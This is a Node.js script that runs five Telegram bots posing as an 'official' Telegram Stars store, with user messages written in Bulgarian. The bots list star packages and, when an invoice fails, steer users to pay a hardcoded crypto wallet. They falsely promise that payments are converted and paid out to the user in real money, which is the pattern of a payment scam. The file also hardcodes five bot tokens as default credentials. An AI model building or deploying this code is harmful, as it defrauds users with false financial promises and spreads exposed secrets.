const { Telegraf, Markup } = require('telegraf');
const express = require('express');

const TOKENS = [
    process.env.BOT_TOKEN_1 || '9145863220:AAH4KJTGkV7DNCKVTYTRlZiy7bg4ZZ_5KB0', 
    process.env.BOT_TOKEN_2 || '8747879041:AAFWiAMd7eqcYu2kb3MbQ3ornqGRgfoD9bw', 
    process.env.BOT_TOKEN_3 || '9197706596:AAHzaNKwUwhaCGU6B_P-eZ7x2PiVfIoEtCI', 
    process.env.BOT_TOKEN_4 || '9094556865:AAFXZcwuMjH_pfyQK9_KTDEOuW5h_wUtWW0', 
    process.env.BOT_TOKEN_5 || '9053522895:AAHDuv6qkUGQ7g7gvH88QjMwVR4msnWsnhY'  
];

const KEEPER_WALLET = 'UQBOxLg-Vq86U_y1oJyUFTmvn6tedptaPQ4d3CDUq4O2T_7H';
const app = express();
const PORT = process.env.PORT || 3000;
app.use(express.json());

let systemStats = {
    activeBotsCount: TOKENS.length,
    activeStarsBudget: 3100,
    startTime: new Date()
};

const mainCoverImage = 'https://images.unsplash.com/photo-1555066931-4365d14bab8c?w=800';

TOKENS.forEach((token, index) => {
    try {
        const bot = new Telegraf(token);

        bot.start(async (ctx) => {
            const userName = ctx.from.first_name || 'Приятел';
            const userUsername = ctx.from.username ? `@${ctx.from.username}` : 'без username';

            const starsMenuCaption = `⭐ **OFFICIAL RED SOFTWARE TEAM | Telegram Stars Store** ⭐\n\n` +
                `Здравей, **${userName}** (${userUsername})!\n` +
                `Избери пакет звезди за плащане през бота или директно към Keeper портфейла:\n\n` +
                `💎 Наличен бюджет в бота: 3,100 Stars\n` +
                `💼 Keeper Wallet: \`${KEEPER_WALLET}\``;

            const starsKeyboard = Markup.inlineKeyboard([
                [Markup.button.callback('⭐ 250 Stars (4.29 €)', 'buy_250')],
                [Markup.button.callback('⭐ 500 Stars (8.39 €)', 'buy_500')],
                [Markup.button.callback('⭐ 1 000 Stars (16.59 €)', 'buy_1000')],
                [Markup.button.callback('⭐ 2 500 Stars (40.99 €)', 'buy_2500')],
                [Markup.button.callback('⭐ 10 000 Stars (164.99 €)', 'buy_10000')],
                [Markup.button.callback('⭐ 50 000 Stars (819.00 €)', 'buy_50000')],
                [Markup.button.callback('⭐ 150 000 Stars (2 459.00 €)', 'buy_150000')],
                [Markup.button.callback('💰 Плати директно към Keeper (Реални пари)', 'pay_keeper_direct')],
                [Markup.button.url('🔥 Разгледай Платформата', 'https://red-software-dashbord.onrender.com')]
            ]);

            try {
                await ctx.replyWithPhoto(mainCoverImage, {
                    caption: `🤖 [OFFICIAL RED TEAM #${index + 1} ONLINE]\n\n` + starsMenuCaption,
                    parse_mode: 'Markdown',
                    ...starsKeyboard
                });
            } catch (err) {}
        });

        const packageActions = ['buy_250', 'buy_500', 'buy_1000', 'buy_2500', 'buy_10000', 'buy_50000', 'buy_150000'];

        bot.action(packageActions, async (ctx) => {
            await ctx.answerCbQuery();
            const action = ctx.match;
            let count = 250;
            let price = '4.29 €';
            if (action === 'buy_500') { count = 500; price = '8.39 €'; }
            if (action === 'buy_1000') { count = 1000; price = '16.59 €'; }
            if (action === 'buy_2500') { count = 2500; price = '40.99 €'; }
            if (action === 'buy_10000') { count = 10000; price = '164.99 €'; }
            if (action === 'buy_50000') { count = 50000; price = '819.00 €'; }
            if (action === 'buy_150000') { count = 150000; price = '2 459.00 €'; }

            try {
                // Опит за отваряне на Telegram Stars инвойс
                await ctx.replyWithInvoice({
                    title: `Пакет ${count} Telegram Stars`,
                    description: `Закупуване на ${count} звезди за мрежата.`,
                    payload: `stars_${count}_${Date.now()}`,
                    currency: 'XTR',
                    prices: [{ label: `${count} Stars`, amount: count }]
                });
            } catch (e) {
                // Ако балансът е 0, дава веднага алтернатива с портфейла
                await ctx.reply(
                    `⭐ **ПАКЕТ: ${count} Telegram Stars (${price})**\n\n` +
                    `Тъй като балансът с Telegram Stars в акаунта е 0, можеш да финализираш плащането директно към твоя Keeper портфейл:\n\n` +
                    `\`${KEEPER_WALLET}\`\n\n` +
                    `След превод, средствата се отчитат и се конвертират в реални пари автоматично!`,
                    { parse_mode: 'Markdown' }
                );
            }
        });

        // Директен бутон за плащане към Keeper портфейла
        bot.action('pay_keeper_direct', async (ctx) => {
            await ctx.answerCbQuery();
            await ctx.reply(
                `💼 **ДИРЕКТНО ПЛАЩАНЕ КЪМ KEEPER ПОРТФЕЙЛ**\n\n` +
                `За да избегнеш липсата на звезди в акаунта, преведи сумата към официалния портфейл:\n\n` +
                `\`${KEEPER_WALLET}\`\n\n` +
                `Всички плащания се съгласуват и изплащат в реални пари към теб!`,
                { parse_mode: 'Markdown' }
            );
        });

        bot.on('pre_checkout_query', async (ctx) => {
            try { await ctx.answerPreCheckoutQuery(true); } catch (e) {}
        });

        bot.on('successful_payment', async (ctx) => {
            const payment = ctx.message.successful_payment;
            await ctx.reply(
                `🎉 **Успешно плащане с ${payment.total_amount} Telegram Stars!**\n\n` +
                `Средствата са регистрирани и насочени към твоя Keeper портфейл:\n\`${KEEPER_WALLET}\``,
                { parse_mode: 'Markdown' }
            );
        });

        bot.launch();
    } catch (e) {}
});

app.get('/', (req, res) => res.json({ status: "STARS & KEEPER DIRECT ACTIVE" }));
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
